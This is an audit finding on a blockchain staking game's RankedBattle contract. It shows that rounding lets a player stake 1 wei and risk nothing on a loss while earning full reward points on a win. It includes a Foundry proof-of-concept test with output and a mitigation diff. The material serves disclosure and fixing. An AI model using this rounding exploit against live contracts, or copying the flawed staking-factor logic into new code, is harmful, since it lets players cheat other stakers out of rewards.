[H-05] Malicious user can stake an amount which causes zero curStakeAtRisk on a loss but equal rewardPoints to a fair user on a win
Submitted byt0x1c, also found byAamir, peanuts (1,2),YouCrossTheLineAlfie,ubermensch,d3e4,shaka,alexxander,CodeWasp,0xDetermination,evmboi32,Honour,DarkTower,ni8mare,Blank_Space, McToady (1,2),neocrao,PedroZurdo,ZanyBonzy,VAD37,DanielArmstrong, 14si2o_Flint (1,2),forkforkdog,MidgarAudits,n0kto,Krace,MrPotatoMagic,0xAadi,0xBinChook,immeas, btk (1,2),forgebyola,aslanbek, Draiakoo (1,2),petro_1912,ktg,israeladelaja,0xCiphky,Merulez99,swizz,0rpse,Silvermist, ubl4nk (1,2),dimulski, erosjohn (1,2),fnanni,yotov721,Abdessamed,djxploit, csanuragjain (1,2),Kalogerone,shaflow2,WoolCentaur,Tychai0s,handsomegiraffe,AC000123, VrONTg (1,2,3),okolicodes,Velislav4o, andjuancito
The_getStakingFactor()function rounds-up thestakingFactor_to one if its zero. Additionally, the_addResultPoints()function rounds-down thecurStakeAtRisk.Whenever a player loses and has no accumulated reward points, 0.1% of his staked amount is considered “at risk” and transferred to the_stakeAtRiskAddress. However due to the above calculation styles, he can stake just1 weiof NRN to have zerocurStakeAtRiskin case of a loss and in case of a win, still gain the same amount of reward points as a player staking4e18-1wei of NRN.
Let’s look at three cases of a player with ELO as 1500:
CaseStaked NRNstakingFactor calculated by the protocolReward Points accumulated in case of a WINNRNs lost (stake at risk) in case of a LOSS14215000.00423.99999999999999999917500.00399999999999999930.00000000000000000117500
As can be seen in Case2 vs Case3, a player staking0.000000000000000001 NRN(1 wei) has the same upside in case of a win as a player staking3.999999999999999999 NRN(4e18-1 wei) while their downside is0.
Proof of Concept
Add the following test insidetest/RankedBattle.t.soland run viaforge test -vv --mt test_t0x1c_UpdateBattleRecord_SmallStaketo see the ouput under the 3 different cases:
functiontest_t0x1c_UpdateBattleRecord_SmallStake()public{addressplayer=vm.addr(3);_mintFromMergingPool(player);uint8tokenId=0;_fundUserWith4kNeuronByTreasury(player);// snapshot the current stateuint256snapshot0=vm.snapshot();vm.prank(player);_rankedBattleContract.stakeNRN(4e18,0);console.log("\n\n==================================== CASE 1 ==========================================================");emitlog_named_decimal_uint("Stats when staked amount =",4e18,18);// snapshot the current stateuint256snapshot0_1=vm.snapshot();vm.prank(address(_GAME_SERVER_ADDRESS));_rankedBattleContract.updateBattleRecord(0,50,0,1500,true);// if player had won(uint256wins,,) =_rankedBattleContract.fighterBattleRecord(tokenId);assertEq(wins,1);console.log("\n----------------------------------  IF WON  ---------------------------------------------------");console.log("accumulatedPointsPerFighter =:",_rankedBattleContract.accumulatedPointsPerFighter(0,0));emitlog_named_decimal_uint("getStakeAtRisk =",_stakeAtRiskContract.getStakeAtRisk(tokenId),18);emitlog_named_decimal_uint("_rankedBattleContract NRN balance =",_neuronContract.balanceOf(address(_rankedBattleContract)),18);emitlog_named_decimal_uint("_stakeAtRiskContract NRN balance =",_neuronContract.balanceOf(address(_stakeAtRiskContract)),18);// Restore to snapshot statevm.revertTo(snapshot0_1);vm.prank(address(_GAME_SERVER_ADDRESS));_rankedBattleContract.updateBattleRecord(0,50,2,1500,true);// if player had lost(,,uint256losses) =_rankedBattleContract.fighterBattleRecord(tokenId);assertEq(losses,1);console.log("\n----------------------------------  IF LOST  ---------------------------------------------------");console.log("accumulatedPointsPerFighter =",_rankedBattleContract.accumulatedPointsPerFighter(0,0));emitlog_named_decimal_uint("getStakeAtRisk =",_stakeAtRiskContract.getStakeAtRisk(tokenId),18);emitlog_named_decimal_uint("_rankedBattleContract NRN balance =",_neuronContract.balanceOf(address(_rankedBattleContract)),18);emitlog_named_decimal_uint("_stakeAtRiskContract NRN balance =",_neuronContract.balanceOf(address(_stakeAtRiskContract)),18);// Restore to snapshot statevm.revertTo(snapshot0);vm.prank(player);_rankedBattleContract.stakeNRN(4e18-1,0);console.log("\n\n==================================== CASE 2 ==========================================================");emitlog_named_decimal_uint("Stats when staked amount =",4e18-1,18);// snapshot the current stateuint256snapshot1_1=vm.snapshot();vm.prank(address(_GAME_SERVER_ADDRESS));_rankedBattleContract.updateBattleRecord(0,50,0,1500,true);// if player had won(wins,,) =_rankedBattleContract.fighterBattleRecord(tokenId);assertEq(wins,1);console.log("\n----------------------------------  IF WON  ---------------------------------------------------");console.log("accumulatedPointsPerFighter =:",_rankedBattleContract.accumulatedPointsPerFighter(0,0));emitlog_named_decimal_uint("getStakeAtRisk =",_stakeAtRiskContract.getStakeAtRisk(tokenId),18);emitlog_named_decimal_uint("_rankedBattleContract NRN balance =",_neuronContract.balanceOf(address(_rankedBattleContract)),18);emitlog_named_decimal_uint("_stakeAtRiskContract NRN balance =",_neuronContract.balanceOf(address(_stakeAtRiskContract)),18);// Restore to snapshot statevm.revertTo(snapshot1_1);vm.prank(address(_GAME_SERVER_ADDRESS));_rankedBattleContract.updateBattleRecord(0,50,2,1500,true);// if player had lost(,,losses) =_rankedBattleContract.fighterBattleRecord(tokenId);assertEq(losses,1);console.log("\n----------------------------------  IF LOST  ---------------------------------------------------");console.log("accumulatedPointsPerFighter =",_rankedBattleContract.accumulatedPointsPerFighter(0,0));emitlog_named_decimal_uint("getStakeAtRisk =",_stakeAtRiskContract.getStakeAtRisk(tokenId),18);emitlog_named_decimal_uint("_rankedBattleContract NRN balance =",_neuronContract.balanceOf(address(_rankedBattleContract)),18);emitlog_named_decimal_uint("_stakeAtRiskContract NRN balance =",_neuronContract.balanceOf(address(_stakeAtRiskContract)),18);// Restore to snapshot statevm.revertTo(snapshot0);vm.prank(player);_rankedBattleContract.stakeNRN(1,0);console.log("\n\n==================================== CASE 3 ==========================================================");emitlog_named_decimal_uint("Stats when staked amount =",1,18);// snapshot the current stateuint256snapshot2_1=vm.snapshot();vm.prank(address(_GAME_SERVER_ADDRESS));_rankedBattleContract.updateBattleRecord(0,50,0,1500,true);// if player had won(wins,,) =_rankedBattleContract.fighterBattleRecord(tokenId);assertEq(wins,1);console.log("\n----------------------------------  IF WON  ---------------------------------------------------");console.log("accumulatedPointsPerFighter =:",_rankedBattleContract.accumulatedPointsPerFighter(0,0));emitlog_named_decimal_uint("getStakeAtRisk =",_stakeAtRiskContract.getStakeAtRisk(tokenId),18);emitlog_named_decimal_uint("_rankedBattleContract NRN balance =",_neuronContract.balanceOf(address(_rankedBattleContract)),18);emitlog_named_decimal_uint("_stakeAtRiskContract NRN balance =",_neuronContract.balanceOf(address(_stakeAtRiskContract)),18);// Restore to snapshot statevm.revertTo(snapshot2_1);vm.prank(address(_GAME_SERVER_ADDRESS));_rankedBattleContract.updateBattleRecord(0,50,2,1500,true);// if player had lost(,,losses) =_rankedBattleContract.fighterBattleRecord(tokenId);assertEq(losses,1);console.log("\n----------------------------------  IF LOST  ---------------------------------------------------");console.log("accumulatedPointsPerFighter =",_rankedBattleContract.accumulatedPointsPerFighter(0,0));emitlog_named_decimal_uint("getStakeAtRisk =",_stakeAtRiskContract.getStakeAtRisk(tokenId),18);emitlog_named_decimal_uint("_rankedBattleContract NRN balance =",_neuronContract.balanceOf(address(_rankedBattleContract)),18);emitlog_named_decimal_uint("_stakeAtRiskContract NRN balance =",_neuronContract.balanceOf(address(_stakeAtRiskContract)),18);}
Output:
==================================== CASE 1 ==========================================================Stats when staked amount =: 4.000000000000000000----------------------------------  IF WON  ---------------------------------------------------accumulatedPointsPerFighter =: 1500getStakeAtRisk =: 0.000000000000000000_rankedBattleContract NRN balance =: 4.000000000000000000_stakeAtRiskContract NRN balance =: 0.000000000000000000----------------------------------  IF LOST  ---------------------------------------------------accumulatedPointsPerFighter = 0getStakeAtRisk =: 0.004000000000000000_rankedBattleContract NRN balance =: 3.996000000000000000_stakeAtRiskContract NRN balance =: 0.004000000000000000==================================== CASE 2 ==========================================================Stats when staked amount =: 3.999999999999999999----------------------------------  IF WON  ---------------------------------------------------accumulatedPointsPerFighter =: 750getStakeAtRisk =: 0.000000000000000000_rankedBattleContract NRN balance =: 3.999999999999999999_stakeAtRiskContract NRN balance =: 0.000000000000000000----------------------------------  IF LOST  ---------------------------------------------------accumulatedPointsPerFighter = 0getStakeAtRisk =: 0.003999999999999999_rankedBattleContract NRN balance =: 3.996000000000000000_stakeAtRiskContract NRN balance =: 0.003999999999999999==================================== CASE 3 ==========================================================Stats when staked amount =: 0.000000000000000001----------------------------------  IF WON  ---------------------------------------------------accumulatedPointsPerFighter =: 750getStakeAtRisk =: 0.000000000000000000_rankedBattleContract NRN balance =: 0.000000000000000001_stakeAtRiskContract NRN balance =: 0.000000000000000000----------------------------------  IF LOST  ---------------------------------------------------accumulatedPointsPerFighter = 0getStakeAtRisk =: 0.000000000000000000_rankedBattleContract NRN balance =: 0.000000000000000001_stakeAtRiskContract NRN balance =: 0.000000000000000000
Tools used
Foundry
Recommended Mitigation Steps
Protocol can choose to set a minimum stake amount of4 NRN(4e18 wei). One needs to take care that even after a partial unstake, this amount is not allowed to go below4 NRN.Also, do not round upstakingFactor_i.e. removeL530-L532. An additional check can be added too which ensures thatstakingFactor_is greater than zero:
File: src/RankedBattle.sol519:              function _getStakingFactor(520:                  uint256 tokenId,521:                  uint256 stakeAtRisk522:              )523:                  private524:                  view525:                  returns (uint256)526:              {527:                uint256 stakingFactor_ = FixedPointMathLib.sqrt(528:                    (amountStaked[tokenId] + stakeAtRisk) / 10**18529:                );- 530:                if (stakingFactor_ == 0) {- 531:                  stakingFactor_ = 1;- 532:                }+ 532:                require(stakingFactor_ > 0, "stakingFactor_ = 0");533:                return stakingFactor_;534:              }
The above fixes would ensure thatcurStakeAtRiskcan never be gamed to 0 while still having a positive reward potential.It’s may also be a good idea to have a provision to return any “extra” staked amount. For example, if only 4 NRN is required to achieve a stakingFactor of 1 and the player stakes 4.5 NRN, then the extra 0.5 NRN could be returned. This however is up to the protocol to consider.
raymondfam (lookout) commented:
Strategic dodging to avoid penalty. Might as well fully unstake to make curStakeAtRisk 0. However, points would be zero if at risk penalty were to kick in.
hickuphh3 (judge) increased severity to High